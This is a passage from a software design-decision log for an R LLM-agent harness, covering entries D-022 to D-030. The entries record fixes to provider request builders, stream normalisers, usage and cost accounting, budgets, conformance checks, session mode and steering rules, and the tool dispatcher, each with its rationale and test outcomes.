   constructor zero when the model had no `prices`), a declared zero rate (a local Ollama model)
   a known zero; a price table `usage_cost()` refuses gives an unknown cost. On the `plan-cli`
   route P20 must still set the cost from the CLI's reported `total_cost_usd` (D-015 point 3).
3. **Contract-typed stop reasons and error types.** A non-string Anthropic `stop_reason` or error
   `type` is mapped to `error`/`provider` (R's `switch()` would have picked an alternative by
   position: `2` became `stop`, `5` became `auth`), and `raw_stop_reason` is stored as text
   (04 section 4.2: chr(1)).
4. **push() after a refused retry.** When the transport's `retry(info)` refuses at once and calls
   `fail()` from inside it, `push()` returns `TRUE` (the terminal event was emitted, 04 section
   8.1); the plan returned `FALSE`.
5. **The 5-minute/1-hour cache split survives `message_delta`.** The current wire shape repeats
   the cumulative `cache_creation_input_tokens` in `message_delta` without a `cache_creation`
   object (report 07 section 3.14). The plan treated that bare total as a new split (every write
   5-minute, `cache_write_1h = 0`), so 1-hour writes (gptr's BP1/BP2 default) were priced at the
   5-minute rate. A bare total now updates the split (`anthropic_cache_total()`): a split that
   adds up to it is kept, otherwise the known 1-hour writes are kept and the rest are 5-minute
   writes; only when no split was ever reported is every write a 5-minute write (report 07
   section 3.5). `usage.iterations` is not used (its relation to the top-level totals is not
   verified).

Validation: `progress/P12.md`, Task 1 (`test-provider-anthropic.R`; the four regression tests
failed 9 assertions against the plan-literal source; the two review-round regression tests for
points 1 and 5 failed 7 assertions before the fix).

## D-023 - P12 request headers from the resolved provider record, merged by name; no thinking without budget room (2026-10-03)

Four changes to P12 Task 2's plan-literal request builder (`R/provider-anthropic.R`):

1. **`adp_provider_headers(model, opts = NULL)`.** The plan's helper took only `model` and looked
   the provider up again with the global `provider_get()`. That lookup never sees a session-scoped
   (rank 0) record, such as a provider passed as `model = <spec>` (04 section 10.1). Such a
   provider's non-secret `headers` (04 section 10.2 row 1) were dropped. When a session record
   shadowed a global one with the same id, the request mixed the session record's base URL and
   credential with the global record's headers. The helper now uses the record that
   `provider_stream()` resolved and passed as `opts$provider` (session first, settings applied;
   P05 ambiguity 13). It accepts that record when the model's provider is its id, name or one of
   its aliases. Otherwise it uses the session's own record (`opts$session`, with the settings
   applied), and only then the global `provider_get()`. The argument is optional, so the plan's
   one-argument calls still work. Tasks 5, 7 and 9 must call `adp_provider_headers(model, opts)`
   so the defect does not spread to their adapters.
2. **A budget model with no room for the minimum budget sends no thinking.** The plan's clamp
   `min(budget, max(1024, max_tokens - 1024))` gave `budget_tokens = max_tokens` when the model's
   `max_output` (or the requested `max_tokens`) left `max_tokens <= 1024`. The API needs
   `1024 <= budget_tokens < max_tokens` (report 07 section 2.6, and the plan's own body rule "a
   budget below `max_tokens`"). In that case the body now carries no `thinking` and no
   interleaved-thinking beta, and `max_tokens` stays at the requested value (capped by
   `max_output`) instead of the raised one. Any `max_tokens` above 1024 keeps budget thinking,
   with the plan's clamp. No current catalog model is affected (Haiku 4.5 has `max_output`
   64000).
3. **Provider headers are merged, not appended: `adp_merge_headers(base, extra, lists, auth)`.**
   The plan's `headers = c(headers, adp_provider_headers(model))` repeats a name when the record
   (or `providers.<id>.headers` in settings) sets one the adapter also sets, and P04's
   `http_headers()` refuses a spec with a repeated name (in any case), so the request never left
   the process. An `anthropic-beta` header in the record broke only requests where gptr adds its
   own beta (an OAuth token, budget thinking, inline tool additions), so it could fail mid-session.
   The helper compares names case-insensitively. The adapter's headers win: a record header with
   the name of one the adapter set is dropped, so a record never changes the wire format
   (`content-type`, `accept`, the API version) or replaces the credential. This differs from Pi,
   where caller headers replace defaults, because gptr's parser and credential handling depend on
   them. Two exceptions. A header named in `lists` (for Anthropic `anthropic-beta`) gets the
   tokens of both sides, the adapter's first, each once. While the adapter sends a credential, a
   record header named in `auth` (for Anthropic `x-api-key` and `authorization`) is dropped, so
   two credentials are never sent (plan Global Constraints: "never sends both"). Without a
   credential, such a record header is sent as it is. Of two record headers with the same name,
   the last is kept. Tasks 5, 7 and 9 must call
   `adp_merge_headers(headers, adp_provider_headers(model, opts), auth = <their credential
   header names>)` instead of the plan's `c()`: Chat Completions `c("authorization", "api-key")`,
   Responses `"authorization"`, Gemini `"x-goog-api-key"`.
4. **An image-only tool result for a model without image input carries only the omission note.**
   The plan's `anthropic_tool_result()` led every result without text with "(see attached
   image)", also when each image had been replaced by the note "(image omitted: this model does
   not accept images)", so the model got two contradicting notes. The lead is now added only when
   an image block is attached. P05's `handoff_transform()` usually strips images for text-only
   targets first, so this mainly concerns direct `build()` callers.

Validation: `progress/P12.md`, Task 2 review rounds 1 and 2. The round-1 regression tests failed 7
assertions against the plan-literal source; the round-2 tests failed 6 (4 header, 2 image note).

## D-024 - IC-74 usage roll-up: request ids are required, an unknown cache read stays unknown (2026-10-03)

P06 Task 4's literal `usage_add()` and `ledger_mark_cached()` predate IC-74 (07-local-ollama.md
section 5: "Missing usage remains unknown"). Two behaviours changed, which Tasks 10, 11 and 13,
P18's tests and P19's roll-up consume:

1. **Every usage row needs its request id.** `usage_add(s, row)` refuses a row whose
   `request_id` is `NA` with `gptr_error_invalid_argument` (`arg = "row$request_id"`) before any
   session changes. `session_usage_rows()` de-duplicates by request id (a request recorded twice
   counts once), so distinct rows without an id would have collapsed into one and understated the
   totals. P05's `usage_row()` always sets an id (it generates one when the message has none) and
   every planned caller passes one.
2. **An unknown cache read leaves the ledger's cache flags unknown.**
   `ledger_mark_cached(s, request_id, cache_read)` with `cache_read = NA` (a reported usage whose
   cache read is unknown) sets that request's `cached` flags to `NA`; the plan left them `FALSE`, a
   claim that nothing was cached. A fully unreported usage (D-022) is first replaced by Task 10's
   estimate, whose `cache_read` is 0, so it never reaches the ledger as `NA`. A known zero still leaves them `FALSE`, and a positive read marks the
   leading components as planned.

The session footer follows D-021: an unknown token count or cost prints as `unknown tokens` /
`unknown cost` (new `format_cost()`), never `$NA` or zero, and `s$cost` is `NA` when any request's
cost is unknown.

Validation: `progress/P06.md`, Task 4 (`test-session-budget.R`, `test-session-object.R`; the added
tests failed 8 assertions against the plan-literal code).

## D-025 - IC-74 budgets compare the known usage; an unknown cost cannot reach a budget (2026-10-04)

P06 Task 5's literal `run_used()`, `budget_check()` and `budget_near()` predate IC-74
(07-local-ollama.md section 5: "Missing usage remains unknown"). Since D-015, D-021 and D-022 a
request of an unpriced model has cost `NA`, and a reported usage can carry an unknown column (for
example the cache read). The plan summed each row with `+` and `sum()`, so one unknown value made
the run's total `NA`, and `if (... used$cost >= lim$cost)` then stopped the engine with base R's
unclassed "missing value where TRUE/FALSE needed" before every later request of the call. The
behaviour now, which Task 10 (`run_request()`, `run_response()`, `run_budget_extend()`,
`run_stop_budget()`), P19's shared pools and P20's `--max-budget-usd` consume:

1. **Budgets compare the known part of the usage.** `run_used(run)` sums each token column and
   the cost on its own with `na.rm = TRUE`. An unknown value adds nothing known, so it can never
   reach a limit, and a row's known input and output still count when its cache read is unknown.
   `turns` counts every request, known or not. The `used` that `budget_check()` returns and that
   `budget_near` (and Task 10's `budget_exceeded` and `gptr.budget`) carries is therefore a lower
   bound when a request's usage is unknown. It is never a claim that the unknown part was zero:
   the session's own totals stay `NA` (D-021, D-024).
2. **Consequence: the cost budget cannot be enforced for unpriced requests.** A call on a model
   without price evidence is still capped by the token budget (default 2,000,000 tokens per
   top-level call, IC-66), which Task 10 always feeds with known or estimated tokens (D-024 item 2).
   Treating an unknown cost as reaching the cost budget (fail closed) was considered and rejected:
   with the default 5 USD budget every unpriced cloud model would stop with status `budget` after
   its first request, unless the user disabled the cost budget. A maintainer who prefers the
   fail-closed reading changes only `run_used()`/`budget_check()`.
3. **`budget_check(s, estimate)` refuses an estimate that is not one nonnegative number**
   (`gptr_error_invalid_argument`, `arg = "estimate"`) instead of propagating `NA` into the
   comparison. Task 10 passes `req$tokens_est %||% 0`.

Validation: `progress/P06.md`, Task 5 (`test-session-budget.R`; the three added blocks failed 4
times against the plan-literal source: three unclassed `if (NA)` errors and an `NA` token total).

## D-026 - P12 conformance: no normaliser error, warning or message escapes, http_json goldens are not cases; classifier coverage open (2026-10-04), and (FIX-6) classifier adapters are replayed against classifier fixtures, golden canonical answers and P13's validator, which moves to s1-types.R (2026-10-05)

P12 Task 3's plan-literal `check_adapter()` (the `check.adapter` service behind `gptr_check()`
for adapter specs, `R/provider-anthropic.R`) was changed in three ways. P02's `gptr_check()` and
P24 consume it.

1. **A warning or message from a normaliser fails the case.** 04 section 8.1 says "Normalisers
   never signal R conditions after `start`". The plan's replay caught only errors. A normaliser
   that warned therefore passed the check, and its warnings reached the caller of
   `check_adapter()` and `gptr_check()`. The new `adp_check_replay()` wraps `adp_replay()` in
   exiting `warning` and `message` handlers (`tryCatch()`), and `check_adapter()` uses it for the
   whole and the chunked replays. The first such condition ends that replay and becomes its
   condition, as an error already did:
   - a condition in the whole replay fails `adapter.<case>.no_condition`, and the case's other
     rows (`.event_order`, the goldens, `.chunk_invariance`, `.roundtrip`) are not produced;
   - a condition that appears only in a chunked replay fails `.chunk_invariance`.

   The handlers exit rather than muffle. A warning or message raised with `signalCondition()`
   has no muffle restart: `invokeRestart("muffleWarning")` then threw "no 'restart'
   'muffleWarning' found" out of `check_adapter()`, and `tryInvokeRestart()` would let the
   condition go on to the caller's own calling handlers. With exiting handlers, nothing reaches
   the caller in either case. `adp_replay()` is unchanged.
2. **`http_json` fixtures exclude the golden files.** The plan selected `\.json$` files, which
   also match `<case>.events.json`, `<case>.message.json` and `model.json`. For an `http_json`
   adapter with a stream `parse`, those three were then replayed as extra cases. They are now
   excluded. No P12 adapter uses `http_json`, so the four built-in results are unchanged.
3. **Diagnostics and arguments.**
   - If `build()` fails, the `adapter.tool_choice` row names the error. The plan reported every
     failure as "a list tool_choice was sent".
   - The `adapter.replay` row keeps `ok = TRUE` and carries the note "nothing to replay: no
     stream normaliser (inprocess or classifier adapter)".
   - `adapter` must be a list and `fixtures` `NULL` or one string, else
     `gptr_error_invalid_argument`.

**Open point (IC-74, not resolved).** The P12 row of 07-local-ollama.md section 6 says
"classifier adapters receive conformance coverage". As in the plan (its ambiguity 15), Task 3
returns only `adapter.replay` for a classifier adapter (`classify` without a stream `parse`). It
does not replay classifier wire fixtures through
`classify$parse(model, status, headers, body, questions)` or `run()`, and does not validate the
canonical `noul`/`choice`/`score` records of 07 section 3. Two things are missing:
- a classifier fixture layout, which no spec defines;
- the canonical-answer validator, which P13 owns (`s1_dispatch()`, `R/s1-ollama.R`,
  `fixtures/jev/`).

The coordinator or maintainer must decide whether that coverage belongs in `check_adapter()` once
P13 provides these, or in P13's own conformance tests. Until it has an owner, P12's plan
acceptance should carry this point as open rather than record IC-74's P12 row as met.

**Open point closed (FIX-6, 2026-10-05; `progress/fixes.md`).** The coordinator scheduled it as
FIX-6. The coverage belongs in `check_adapter()`, not in a classifier branch of P02's
`gptr_check()`: contract 6.7 sends an adapter spec to `check_adapter()` (the `check.adapter`
service, 7.12), and `ext-check.R` is L0, which may not call the s1 area. Behaviour:

1. **Classifier adapters get their own replay.** An adapter with `classify` no longer returns the
   single `adapter.replay` row (plan Task 3 and its ambiguity 15). `check_adapter()` replays every
   case of `fixtures/classifier/<api>/` (or `fixtures`), once, through
   `classify$parse(model, status, headers, body, questions)`. An inprocess classifier goes
   through `classify$run(model, state, questions, opts)` instead. The fixture model is
   `adp_fixture_model(api, dir, type = "classifier")` with `model.json` over it.
2. **Layout.** `<case>.json` holds `questions` (the ordered wire questions), `state`, `status`
   (default 200), `headers` and `body`. A JSON string `body` is the body text byte for byte, so
   malformed bodies can be written; any other JSON value is sent as its compact JSON. Each case
   has one golden:
   - `<case>.answers.json`: the canonical answers by question id, in question order;
     probabilities and legends are objects in request order, and unknown values are `null`;
   - `<case>.error.json`: `{"class", "status"}` of the expected typed error.

   An answered case may also have `<case>.usage.json` (`{"input", "output"}`; `null` is a count
   the service did not report, which must stay NA, IC-74). Every answered built-in case has
   one.
3. **Rows per case.**
   - `.no_condition`: an error, warning or message signalled by the call fails the case.
     Exiting handlers end the call, as `adp_check_replay()` does (item 1 of the first list), so
     nothing reaches the caller. One exception (review round 1): an inprocess `run()` may give a
     `gptr_message` notice. Contract 1.5 sends notices through `gptr_inform()`, and IC-19 has
     `s1-emulate`'s `run()` say once per process that its answers are not calibrated. Such a
     notice is muffled through its `muffleMessage` restart and noted on the passing row. Once
     slots set during the replay are cleared again, so the check neither depends on nor uses up
     the session's once state. A wire `parse()` stays fully silent.
   - `.result`: `list(answers, usage = list(input, output), model_version = chr(1))` or an
     unsignalled `gptr_error_s1` condition (04 section 8.1). Each count is NA or one
     nonnegative, finite number.
   - `.golden_usage`, when `<case>.usage.json` exists: the usage equals it, with an unreported
     count NA.
   - `.canonical`, for answers: P13's validator `s1_check_answers()` (what `s1_dispatch()` runs)
     must return them unchanged. A second (wire) shape, a lost question order or probabilities
     out of request order fail.
   - `.golden_answers`, compared order-sensitively, or `.typed_error`, matching class and status.
   - `.fixture`, instead of the others, for a case file that cannot be read.
4. **Missing fixtures.** A wire classifier without cases fails `adapter.fixtures`, as a stream
   adapter does. The plan's assertion that `gptr_check()` passes a `classify`-only `http_json`
   adapter without fixtures was changed to expect that failure; IC-74 overrides the plan
   literal. An inprocess classifier (P01's `fake-classifier`, `s1-emulate`) without a fixture
   directory keeps `adapter.replay` ("nothing to replay"). Asked for fixtures that hold no case,
   it fails `adapter.fixtures`.
5. **The validator moved to L1.** `provider-anthropic.R` is L1, and an L1 file may not call
   `s1-client.R` (L4); `test-arch-layers.R` flags `adp_check_canonical -> s1_check_answers`.
   The canonical-record validator and its primitives therefore moved unchanged from
   `s1-client.R` to the end of `s1-types.R` (L1, P13's model-access file). The moved objects:
   `s1_types`, `s1_round_tol`, `s1_condition()`, `s1_num()`, `s1_unit()`, `s1_option_keys()`,
   `s1_answer_probs()`, `s1_parse_choice()`, `s1_parse_score()`, `s1_check_answers()`,
   `s1_check_answer()` and `s1_check_probs()`. The 119 definitions of the two files deparse
   identically before and after. This takes no new service, so contract 7.0's complete list
   (and P01's count of 39) is unchanged. Only comments changed besides the move.

Fixtures: `tests/testthat/fixtures/classifier/typesafe-system-one/` (19 cases: recorded Jev
bodies plus hand-written order, computed-value, gateway, partial-usage and malformed cases) and
`.../ollama-system-one/` (13 synthetic cases). Validation: `progress/fixes.md`, Task FIX-6.

Validation: `progress/P12.md`, Task 3. The three added tests failed 7 + 1 + 1 assertions against
the plan-literal source (269 escaped test warnings in the first run). The `signalCondition()`
assertions of review round 1 failed 3 times against the muffling handlers, and 4 times with 216
escaped test warnings against a `tryInvokeRestart()` variant.

## D-027 - P12 Chat Completions normaliser: IC-74 usage, compat from the resolved provider record, typed finish reasons, merged reasoning_details, whole-number HTTP codes (2026-10-04)

P12 Task 4's plan-literal `completions_normaliser()` (`R/provider-openai-completions.R`, the
`parse` of the `openai-completions` adapter that also serves Ollama chat models, IC-74) was
changed in the seven ways below (item 7 from P12's plan acceptance), and two shared helpers in
`R/provider-anthropic.R` changed with it. Task 5 (`completions_build()`), P06's usage rows and P24 consume them.

1. **IC-74 usage** (07-local-ollama.md section 5: "Missing usage remains unknown"; D-022). The
   plan read every usage field with `%||% 0`, so a reported null became a known zero.
   `completions_usage()` now follows D-022's rule. A field the provider left out of a reported
   usage keeps P05's legacy zero. A reported null, or a value that is not a nonnegative number,
   is `NA`. The first known of `prompt_tokens_details.cached_tokens`, `prompt_cache_hit_tokens`
   (DeepSeek) and `cached_tokens` (Kimi) is the cache read, as Pi's `??` chain does, so a null
   `cached_tokens` falls back to the next field; when only nulls were reported the cache read,
   and with it the input, is `NA`. `"usage": null` (OpenAI sends it on every chunk but the last)
   is no report. A stream that reported no usage at all keeps the core's unknown usage (D-022
   point 1): the plan's goldens for `error_chunk` and `truncated` wrote zeros.
2. **Unknown usage in the goldens is JSON null.** The hand-written goldens of those two cases
   record every count as `null` (new `g_usage_unknown()` in `make_fixtures.R`), and
   `adp_golden_message()` projects an `NA` count to `NULL`, the representation the session file
   already uses (`usage_to_json()`). Before this, an `NA` reached `json_encode()` as the string
   `"NA"`. The Anthropic goldens hold no unknown count and are unchanged. Tasks 6 and 8 must write
   `usage = g_usage_unknown()` for a failed or truncated fixture that reports no usage.
3. **The compat record comes from the resolved provider record** (D-023 item 1, extended). The
   plan's `compat_flags(model$provider, model)` looked the provider up globally, so a
   session-scoped provider (`model = <spec>`, 04 section 10.1) lost its `compat`
   (`supports_finish_reason`, `think_tags`, ...), and a session record that shadows a global one
   got the global record's flags. D-023's lookup moved into the shared helper
   `adp_provider_record(model, opts)` (`adp_provider_headers()` now calls it, with unchanged
   behaviour), and the normaliser calls `compat_flags(adp_provider_record(model, opts) %||%
   list(id = <provider id>), model)`. Tasks 5 and 7 must do the same in `build()` instead of the
   plan's `compat_flags(model$provider, model)`.
4. **Contract-typed finish reasons** (04 section 4.2; D-022 point 3). `completions_stop()` maps a
   `finish_reason` that is not one string to `error`; R's `switch()` mapped a number by position
   (`2` became `stop`). `raw_stop_reason` is stored as text.
5. **Robustness without a contract change.** Chunk fields are read with `[[` (no `$` partial
   matching). An `error` given as a bare string is its message. Tool arguments sent as a parsed
   object are serialised back to JSON text instead of being joined as R values. A Mistral
   `thinking` item given as a bare string is thinking text. Each of these previously ended the
   stream with an `internal` error through `adp_guard()` or corrupted the arguments.
6. **OpenRouter `reasoning_details` are merged and accumulated linearly** (04 section 8.1;
   report 09 section 2.3, Pi `openai-completions.ts:665-676`; review round 1). The plan grew the
   list with `c(cur$details, d$reasoning_details)` on every chunk and kept every per-delta
   fragment, so the opaque block, which the session file keeps and Task 5 replays verbatim as
   `reasoning_details`, held one item per delta (20,000 deltas: 20,000 items, 2.0 MB, 3.7 s
   against 0.9 s without details). The new `completions_details()` collects items in the core's
   linear buffer and merges consecutive `reasoning.text` or `reasoning.summary` fragments of the
   same type and `index` (and no conflicting `id`) as Pi does: the text is joined once, and a
   later non-null field such as the closing `signature` is kept. `reasoning.encrypted` and other
   items stay discrete and verbatim; a null item is dropped. Same 20,000 deltas: one item, 129 KB,
   1.4 s. Task 5's `completions_assistant()` replays the merged array unchanged.
7. **Only an HTTP status is read from a numeric error code** (04 section 8.1: "Normalisers never
   signal R conditions after `start`"; D-034 point 3; P12 plan acceptance). The plan's
   `as.integer(code)` warned "NAs introduced by coercion to integer range" for a code outside R's
   integer range (`1e10`, `-1e10`, `Inf`), and that warning escaped `push()`, because
   `adp_guard()` turns only errors into the terminal event. It also truncated a fraction (`429.5`
   became a retried rate limit) and took any number as a status (`99`, or `600` as an overload
   with status 600, which P04's `reactor_retry()` refuses). `completions_error_info()` now reads
   a numeric code only when it is one whole number from 100 to 599, as `google_error_info()`
   does. Any other number gives no status and is never coerced; the error type or code text
   still classifies it (for example `server_error` is still an overload with status 503).
   Task 8's review had recorded this as a follow-up.

Validation: `progress/P12.md`, Task 4. Against the plan-literal source the added tests and the
adapted goldens failed 10 assertions (2 golden messages with `"NA"`, 2 null usages read as zero,
3 for the numeric finish reason, 3 for the session-scoped compat); the point 5 test failed 5 more
(an `internal` error with "$ operator is invalid for atomic vectors" for the string error, empty
object arguments, and an `internal` error for the bare thinking string). Point 6 failed 2
assertions against the per-fragment list (the merged opaque JSON in two streams). Point 7
(`progress/P12.md`, Plan acceptance): its test failed 7 assertions against the previous source,
with one escaped test warning. Three codes warned, three were misread (`429.5`, `99`, `600`), and
the `1e10` error chunk warned through `push()`.

## D-028 - P06 session verbs: no chat on decision models, enqueue checks attachments and model code, mode changes keep the run's invariants (2026-10-04)

P06 Task 6's plan-literal `session_set_model()`, `session_set_mode()`, `mode_block_text()` and
`session_enqueue()` (`R/session-object.R`) were changed in six ways. P08 (`gptr_steer()`, the mode
and model verbs), P11 (the plan execute menu), P14 (the pause menu and the pipe), P15 and P19
(sub-agent reports) and Task 15's `ctx.kernel` consume them.

1. **Decision-only models are refused for chat** (IC-74, 07-local-ollama.md sections 1 and 6:
   "expected failures for chat on decision-only models"). `session_set_model()` resolves `ref`
   purely (no discovery, no I/O) and refuses a model of `type = "classifier"` (the fake
   classifier, `ollama/clef-flash`, `typesafe/jev-latest` and the alias `jev`) before anything is
   appended or emitted, with `provider_stream()`'s refusal (`stream_chat_model()`, D-017 item 3):
   `gptr_error_not_available`, `member` = the resolved ref, `provided_by = "a conversational
   model"`. `model_canonical()` now also returns the resolved `type` (`NULL` for a router or an
   unresolved reference). The plan accepted the switch, so the refusal came only at the next
   request. `session_new()` stays lenient (Task 3); there, `provider_stream()` still refuses at
   the first request.
2. **Attachments are checked before the item enters the queue** (04 section 4.2, IC-55; the steering
   rule of `progress/P06-loop.md`). The loop takes items off the queue destructively and only then
   calls `queue_item_message()`, which refuses a non-text block on a steering relay; the plan
   accepted any list as `blocks`, so such a steer was lost at delivery. `queue_blocks_check()`
   requires an unnamed list of complete user content blocks (`text`, `image` or `context` with
   their string fields) and, for a steer from a user source (`pipe`, `pause_menu`, `repl`,
   `api_user`), text blocks only; otherwise `gptr_error_invalid_argument` with `arg = "blocks"` and
   nothing is queued or emitted. A user steer is refused even on an idle session, because whether
   it is delivered as a relay depends on when a run takes it. Follow-ups, extension notes and agent
   reports keep their user-role shapes; operator relays stay text-only.
3. **The attachments are redacted with the `context` profile at ingress**, as the text is (03
   section 6.5: `context` is egress to providers; image data and replay signatures are left alone
   by `redact_tree()`). The plan redacted only the text.
4. **Only a `mode` context block of rank 3 or more supplies the operator note** (IC-52: operator
   authority only from records of rank 3 or more; 04 section 4.2: operator messages carry harness
   facts only). The note is an operator message, but the plan used the winning `mode` block
   whatever its rank, and the lowest rank wins (session 0, project 1). A session or project record
   named `mode` now gives the one-line notice instead; user, plugin and built-in records (P07's
   `builtin:context`, rank 6) are used as planned. `provide()` sees only the session's ctx (no
   rendering input), so P07's `context_provide_mode()` describes the session's mode; a body whose
   `attrs$name` names a mode other than the one the note is for (a nested run whose effective
   mode item 5 tightens) also gives the notice, so a block is never named for one mode while its
   text describes another. A body without `attrs$name` is used as planned.
5. **A mode change keeps the run's invariants** (`mode_apply_run()`). As in `run_new()`, a nested
   run takes the stricter of its outer run's mode and the new one (IC-53 item 4: "only
   tightened"); the plan set `run$mode` to the new mode, loosening a nested run beyond its outer
   run. The run evaluates `r` in a scratch overlay of its home exactly while its mode is `plan`
   (IC-15: the scratch exists "when the effective mode is `plan`"); the plan left the scratch as it
   was at the start, so a mid-run switch into plan mode evaluated in the home and a mid-run switch
   out of it (any `session_set_mode()` while a run is active, for example from a hook or P14's
   console) kept evaluating in the discarded scratch. The operator note is queued only when the run's mode changes, and it
   names the run's effective mode. This supersedes P11 ambiguity 14's parenthetical
   "`session_set_mode()` changes `run$mode` but not the overlay": the overlay now follows the
   effective mode (P11's execute menu runs at `agent_end`, after the plan run, so its design is
   unchanged).
6. **Model code enqueues only the first input of a never-run session, as a follow-up** (IC-55:
   `gptr_steer()` and `ctx$send()` "called from model-evaluated code of the same session tree are
   refused"; "a child agent's text never appears in an operator message"). The plan exempted any
   item while the session had no entries and no live run, so an `r` call could queue a steer with a
   user source on a never-run session of its tree, which its first run then delivered as the
   operator relay "The user sent this message while you were working: ...". The exception now
   covers only what P08 ambiguity 5 needs, the queued prompt of a `.run = FALSE` call: `as =
   "follow_up"`, no entries, no live run and an empty queue. Steers (any source) and later items
   from model code are refused with `gptr_error_permission`.

Validation: `progress/P06.md`, Task 6. Against the plan-literal source the added tests failed 15
times: the switch to the fake classifier was accepted (2); the nested run was loosened, with notes
for an unchanged effective mode, and a non-session `s` gave an unclassed error (5); no scratch
after a switch into plan mode and a stale one after leaving it (3); project- and session-rank
blocks became operator text (2); an image on a user steer was queued (2); a text attachment kept
its key (1). Review round 1 added item 6 and the `attrs$name` rule of item 4: against the round's
source the extended tests gave [ FAIL 4 | PASS 228 ] (a nested run's note read "BODY FOR auto"
under `<mode name="edits">`; a body named `edits` was used for `plan`; a model-code steer to a
never-run session was accepted, which ended that block).

## D-029 - P12 Chat Completions request bodies: tools only where the model calls tools, no tool_choice without tools, image notes, the bridge after tool results, complete memo keys (2026-10-04)

P12 Task 5's plan-literal `completions_build()` and `completions_tool_results()`
(`R/provider-openai-completions.R`, the `build()` of the `openai-completions` adapter that also
serves Ollama chat models, IC-74) were changed in five ways. They also apply D-023 items 1 and 3
and D-027 item 3 as those entries require: the compat record comes from
`adp_provider_record(model, opts)` and the provider headers are merged with
`adp_merge_headers(..., auth = c("authorization", "api-key"))`. P07's `request_build()`, P06's
runs and P24 consume the bodies.

1. **Tools go only to a model that calls tools** (07-local-ollama.md section 1: "General LLM tool
   calling, images, structured output, streaming and reasoning are enabled only when the selected
   model supports them"; IC-74). P05's Ollama preparation sets `tool_call = FALSE` when the server
   reports no `tools` capability, and Ollama answers a request carrying tools for such a model
   with an error. A model whose record says `tool_call = FALSE` now gets no `tools` (not even the
   plan's `tools: []` for a history with tool calls) and no `tool_choice`; the history's tool calls
   and results are still sent.
   **Reach (corrected in review round 1).** The gate reads the model record P05 resolves, and
   `model_resolve()` always sets the field: an omitted `tool_call` becomes `FALSE`
   (`R/catalog-models.R`, `tool_call = isTRUE(e[["tool_call"]])`), and a generic local id
   (`lmstudio/...`, `llamacpp/...`, `vllm/...` without a catalog entry) gets `tool_call = FALSE`.
   Catalog chat entries carry `TRUE`, because P05's catalog drops models without tool calling. So
   every resolved model on `openai-completions` without `tool_call = TRUE` gets no tools: a user or
   plugin `gptr_provider()` model must declare `tool_call = TRUE` in its model list, and a generic
   LM Studio, llama.cpp or vLLM id gets none. Only a raw model record without the field (adapter
   tests, `gptr_check()` fixtures) keeps the plan's behaviour. Downstream owners: P07's
   `request_build()` and the T1 tool catalog should not advertise tools to a model whose
   `tool_call` is `FALSE`, because this adapter drops them without a notice; and P05's FALSE for
   generic local ids now removes tools for those servers (a P05 decision, recorded here, not
   changed). The test "a resolved model whose record omits tool_call gets no tools" pins this with
   `model_resolve()` records.
2. **No `tool_choice` without a tools array.** OpenAI-compatible hosts refuse `tool_choice` when
   no `tools` are given, and a forced choice would name a tool that is not declared. The plan sent
   `tool_choice: "none"` (or a forced choice) whatever the tools were.
3. **Images in tool results for a text-only model** (D-023 item 4 for this adapter). Each image
   becomes the omission note "(image omitted: this model does not accept images)" in the `tool`
   message, after the text; no image message follows. The plan gave an image-only result
   "(see attached image)" with nothing attached and silently dropped images after text.
4. **The bridging assistant message precedes every user message after tool results** for
   `requires_assistant_after_tool_result` (report 09 sections 3.2 and 3.3; Pi 1233-1238,
   1426-1461, 1443-1448). The `returns` instruction counts as a user message: when tool results
   are the last messages and `returns =` is set, the bridge precedes the instruction. When the
   results' images are attached (a model with image input), the bridge precedes the "Attached
   image(s) from tool result:" user message, and no second bridge follows it, as in Pi, where
   `lastRole` becomes `"user"` (review round 1). The plan put the image message directly after the
   tool messages and the bridge after it, so on such a host every request after a tool returned an
   image (an R plot) had a user message right after tool results. Now a user message never
   directly follows tool results on such a host.
5. **Complete memo keys** (04 section 8.1 memo, plan ambiguity 7: keys cover what reaches the
   wire). Message and tool-result pieces are also keyed by the model's image input, its
   `reasoning` flag (DeepSeek's forced `reasoning_content`) and a hash of the compat record. With
   the plan's keys (provider and model id), a changed compat record (for example a provider's
   `compat` changed in settings) or image input within one session served a stale piece. The
   frozen prefix is unchanged while these stay the same.

Validation: `progress/P12.md`, Task 5. Against the plan-literal source the added tests failed 17
assertions (9 for the resolved provider record, 3 for tools and `tool_choice`, 2 image notes, 1
bridging assistant, 2 in the memo test); a mutation that removes only the new memo-key fields
fails the 2 memo assertions. The plan's 12 tests pass unchanged (the default cache-policy test
skips until P07 registers the `default` policy). `gptr_check()` on the adapter: 25 checks, 0 failed.
Review round 1: the image-bridge regression assertions failed against the round's source
([ FAIL 3 | PASS 267 ], one error ended that test); mutations that drop the compat hash or the
`reasoning` flag from the message memo key each fail one new memo assertion; final
`^provider-openai-completions$` [ FAIL 0 | WARN 0 | SKIP 1 | PASS 274 ].

## D-030 - P06 tool dispatcher: never throws on malformed tool, policy, classifier or UI output; interrupted and nested calls stay paired (2026-10-04)

P06 Task 7's plan-literal `R/agent-dispatch.R` (the dispatcher and `perm_check()`, IC-04, IC-53)
was changed in ten ways. Every change makes the code keep a promise of 04 section 7.6
(`dispatch_tools()` "never throws", `perm_check()` fails closed) or of INFRA-10 (paired execution
events) for input the plan did not guard. The plan's tests all pass unchanged. Task 10's engine,
P10/P18/P22/P23 (`dispatch_nested()`), P18/P20 (`perm_check()`, `tool_result_message()`) and
P11 (policies, UI) consume the code.

1. **A risk record without one `level` from 0 to 4 counts as level 3** (`call_risk()`; IC-54 levels;
   the plan's level for a failing classifier). A tool `risk()` or `risk.classify` answer that is
   not a list, has no level, or has a level such as 7 or `NA` made `risk_level()` throw out of the
   dispatcher (`$ operator is invalid for atomic vectors`), or reached policies as is. A numeric
   level is stored as an integer.
2. **The pipeline of one call cannot throw** (`dispatch_one()` wraps the plan's body, now
   `dispatch_steps()`). An unexpected error (a broken invariant, a failing service) becomes the
   error result `Tool <name> failed in the dispatcher: <message>`, so the call still gets its
   tool-result message and `tool_execution_end`. An interrupt is not an error and still unwinds.
3. **A malformed tool result is an error result** (`tool_run()`, `tool_result_check()`, used
   directly and for nested calls). P02's `as_tool_result()` returns a `gptr_tool_result` unchanged,
   so a hand-built result with, for example, `details = "x"` made `msg_tool_result()` throw out of
   `dispatch_tools()`. Content must be text/image blocks with their string fields (P01's
   `msg_block_types`, `msg_block_fields`), `details` `NULL` or a named list, `is_error` and
   `terminate` `NULL` or one logical.
4. **A policy answer that fails P02's rule for policy answers denies** (`perm_policies()`;
   `ext_policy_ok()`, 04 section 10.2 row 12). The plan checked only the decision. A `modify`
   whose `input` is not a named list was re-checked with that input and, when the policies then
   allowed it, the tool ran with a non-list input that had bypassed validation. A `reason` that is
